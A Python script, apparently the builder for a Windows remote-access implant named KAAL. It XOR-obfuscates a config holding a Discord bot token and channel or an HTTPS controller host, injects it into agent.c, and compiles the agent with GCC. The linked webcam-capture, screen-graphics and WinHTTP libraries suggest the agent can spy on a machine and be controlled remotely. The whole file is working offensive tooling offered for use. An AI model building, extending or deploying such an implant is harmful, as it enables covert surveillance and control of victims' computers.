#!/usr/bin/env python3
"""
KAAL Agent Builder
Automates gathering configuration options, generating the XORed config,
and invoking GCC to build the final executable with the chosen transport.
"""

import sys
import os
import json
import subprocess
import argparse
import random
import string

def generate_random_id(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def xor_encrypt(data, key=0xAA):
    """XOR encrypts a string byte by byte with the given key."""
    return bytes([b ^ key for b in data.encode('utf-8')])

def build_agent(config, output_file, transport, msys_bin="C:\\msys64\\ucrt64\\bin"):
    """Validates config, injects it into agent.c, and runs GCC."""
    agents_dir = os.path.dirname(os.path.abspath(__file__))
    agent_c_path = os.path.join(agents_dir, 'agent.c')
    
    if not os.path.exists(agent_c_path):
        print(f"[!] Error: Cannot find {agent_c_path}")
        return False

    print(f"[*] Base configuration: {json.dumps(config)}")
    config_json = json.dumps(config)
    
    # 1. XOR encrypt the config
    encrypted = xor_encrypt(config_json)
    
    # 2. Format as a C char array for injection
    # Example: char encrypted_agent_config[2048] = {0x12, 0x34, ... , 0x00};
    c_array_elements = ', '.join([f"0x{b:02x}" for b in encrypted])
    c_decl = f"char encrypted_agent_config[2048] = {{{c_array_elements}, 0x00}};"
    
    # 3. Read agent.c and replace the placeholder line
    print("[*] Injecting encrypted config into agent.c...")
    with open(agent_c_path, 'r', encoding='utf-8') as f:
        source_code = f.read()
        
    # Find the line declaring encrypted_agent_config and replace it
    # Format to find: char encrypted_agent_config[2048] =
    lines = source_code.splitlines()
    modified_lines = []
    replaced = False
    
    for line in lines:
        if line.strip().startswith("char encrypted_agent_config[2048] ="):
            modified_lines.append(c_decl)
            replaced = True
        else:
            modified_lines.append(line)
            
    if not replaced:
        print("[!] Error: Could not find 'char encrypted_agent_config[2048] =' in agent.c")
        return False
        
    # Write the modified source to a temporary file for compilation
    temp_agent_c = os.path.join(agents_dir, 'agent_build_temp.c')
    with open(temp_agent_c, 'w', encoding='utf-8') as f:
        f.write("\n".join(modified_lines))
        
    print(f"[*] Starting compilation for transport: {transport}...")
    
    # Base source files
    sources = [temp_agent_c]
    defines = []
    linker_flags = ['-ljson-c', '-lws2_32', '-lgdi32', '-luser32', '-lavicap32', '-lgdiplus', '-lpthread', '-lshlwapi', '-lwinhttp', '-lole32', '-lcrypt32']
    
    # Add transport-specific files and flags
    if transport == 'discord':
        sources.append(os.path.join(agents_dir, 'transport_discord.c'))
        defines.append('-DUSE_DISCORD')
        defines.append('-DUSE_CURL')
        linker_flags.extend(['-lcurl'])
    elif transport == 'https':
        sources.append(os.path.join(agents_dir, 'transport_https.c'))
        defines.append('-DUSE_HTTPS')
    else:
        print(f"[!] Error: Unknown transport '{transport}'")
        return False
        
    # Construct GCC command
    gcc_exe = os.path.join(msys_bin, "gcc.exe")
    if not os.path.exists(gcc_exe):
        print(f"[!] Error: gcc.exe not found at {gcc_exe}")
        return False

    gcc_cmd = [
        gcc_exe, 
        "-o", output_file
    ] + defines + sources + linker_flags
    
    # Run GCC
    print(f"[*] Executing: {' '.join(gcc_cmd)}")
    
    # Setup environment for MinGW
    env = os.environ.copy()
    if msys_bin not in env.get("PATH", ""):
        env["PATH"] = f"{msys_bin};{env.get('PATH', '')}"
        
    try:
        result = subprocess.run(gcc_cmd, env=env, cwd=agents_dir, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"[+] Compilation successful! Output: {output_file}")
            # Clean up temp file
            os.remove(temp_agent_c)
            return True
        else:
            print(f"[!] Compilation failed:\n{result.stderr}")
            return False
    except FileNotFoundError:
        print(f"[!] Error: gcc not found. Ensure MinGW is installed at {msys_bin} or provide --msys-bin")
        return False

def main():
    parser = argparse.ArgumentParser(description="KAAL Agent Builder")
    parser.add_argument("--transport", choices=['discord', 'https'], required=True, help="Transport protocol to use")
    parser.add_argument("--output", "-o", default="agent.exe", help="Output executable name")
    parser.add_argument("--agent-id", help="Manually specify Agent ID. Auto-generated if not provided.")
    parser.add_argument("--msys-bin", default="C:\\msys64\\ucrt64\\bin", help="Path to MinGW bin directory")
    
    # Discord options
    parser.add_argument("--discord-token", help="Discord Bot Token (Required for Discord transport)")
    parser.add_argument("--discord-channel", help="Discord Channel ID (Required for Discord transport)")
    
    # HTTPS options
    parser.add_argument("--https-host", help="HTTPS Server Host (e.g. 192.168.1.100 or example.com)")
    parser.add_argument("--https-port", type=int, default=443, help="HTTPS Server Port")
    parser.add_argument("--no-ssl", action="store_true", help="Use plain HTTP instead of HTTPS")
    
    args = parser.parse_args()
    
    config = {
        "transport": args.transport,
        "agent_id": args.agent_id if args.agent_id else f"agent_{generate_random_id()}"
    }
    
    if args.transport == 'discord':
        if not args.discord_token or not args.discord_channel:
            print("[!] Error: --discord-token and --discord-channel are required for Discord transport.")
            sys.exit(1)
        config["bot_token"] = args.discord_token
        config["channel_id"] = args.discord_channel
        
    elif args.transport == 'https':
        if not args.https_host:
            # Try to read default from a global config if missing, or error out
            print("[!] Error: --https-host is required for HTTPS transport.")
            sys.exit(1)
        config["server_host"] = args.https_host
        config["server_port"] = args.https_port
        config["use_ssl"] = not args.no_ssl

    success = build_agent(config, args.output, args.transport, args.msys_bin)
    if not success:
        sys.exit(1)

if __name__ == "__main__":
    main()
